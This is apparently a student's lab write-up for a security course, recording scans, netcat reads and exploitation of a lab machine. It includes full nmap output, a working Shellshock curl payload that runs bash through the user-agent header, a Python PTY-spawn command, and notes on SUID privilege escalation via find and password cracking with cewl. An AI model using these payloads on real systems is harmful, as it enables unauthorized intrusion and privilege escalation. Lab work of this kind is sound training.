Name: John Cullen
GT Login ID: jcullen33

Task 1:

Ran `ifconfig` to get network.

Scanned IP using `nmap 10.0.2.15/24`.

Found ports of Apache server using `nmap -p- 10.0.2.5`.

Searched for open ports: `nmap -p- 10.0.2.4`

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- 10.0.2.5
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 23:24 EDT
Nmap scan report for 10.0.2.5
Host is up (0.00011s latency).
Not shown: 65523 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
53/tcp   open  domain
80/tcp   open  http
3128/tcp open  squid-http
8080/tcp open  http-proxy
9095/tcp open  unknown
9096/tcp open  unknown
9097/tcp open  unknown
9098/tcp open  unknown
9099/tcp open  unknown
```

```

┌──(kali㉿kali)-[~]
└─$ netcat 10.0.2.5 9095
Answer: 1307941078

┌──(kali㉿kali)-[~]
└─$ netcat 10.0.2.5 9096
Answer: 1766490697

┌──(kali㉿kali)-[~]
└─$ netcat 10.0.2.5 9097
Answer: -972928378

┌──(kali㉿kali)-[~]
└─$ netcat 10.0.2.5 9098
Answer: 73401510

┌──(kali㉿kali)-[~]
└─$ netcat 10.0.2.5 9099
Answer: 2027631930
```

Task 2:

Had a lot of trouble with this one. Was using incorrect http so I had to set `--http0.9`.

Arrived at the command `curl --http0.9 --output - -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/bin/task2 test'" 10.0.2.5/cgi-bin/shellshock.cgi`.

Mainly straightforward. I was banging my head against the wall cause I thought I needed to include the port from part 1.

Task 3:

Also straightforward. Very useful utility that I'll be looking into more. I didn't think Ruby was so commonly used for exploits.

I had no problem in the terminal. I was a bit confused about which exploit/payload to use but got a handle on it.

Task 4:

Started out, got an issue.

`su: must be run from a terminal`

So I found a way around that error.

`echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`
`python /tmp/asdf.py`

This didn't solve anything... but then I read that I needed to list the vulnerable scripts.

I thought it'd be sudo or su. But it turned out to be `find` all along.

https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/

The find command could be used to exec as root. That's crazy.

Task 5:

By far the most fun task. Password cracking.

I've used this tool before but only for fun. This gave a more in depth look on how you'd look for info.

The tools were aleady on Kali so no installation. Kind of already knew to recursively search the web with cewl because I enjoy web-scraping.

Part that gave me a bit of trouble was --rules flag. I would think it'd do that automatically.
